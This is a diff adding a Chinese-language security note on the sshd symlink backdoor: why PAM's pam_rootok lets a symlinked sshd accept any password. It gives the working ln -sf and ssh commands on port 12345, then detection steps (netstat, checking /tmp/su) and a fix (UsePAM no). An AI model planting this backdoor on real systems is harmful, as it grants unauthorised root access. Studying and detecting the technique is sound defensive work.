@@ -1,0 +1,28 @@
+sshd软链接后门
+
+在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。
+实质上PAM认证是通过软连接的文件名(如: /tmp/su，/home/su)在/etc/pam.d/目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)
+任意密码登陆的核心是auth sufficient pam_rootok.so，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。
+
+1、服务端执行
+ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
+ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12345
+ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12345
+
+2、客户端执行
+ssh root@x.x.x.x -p 12345
+
+#输入任意密码就可以root用户权限登陆了，如果root用户被禁止登陆时，可以利用其他存在的用户身份登陆，比如：ubuntu
+检测
+1、查看可疑端口
+netstat -antlp
+2、查看可执行文件
+ls -al /tmp/su
+清除
+1、禁止PAM认证
+vim /etc/ssh/sshd_config
+UsePAM no
+2、重载
+/etc/init.d/sshd reload
+
+
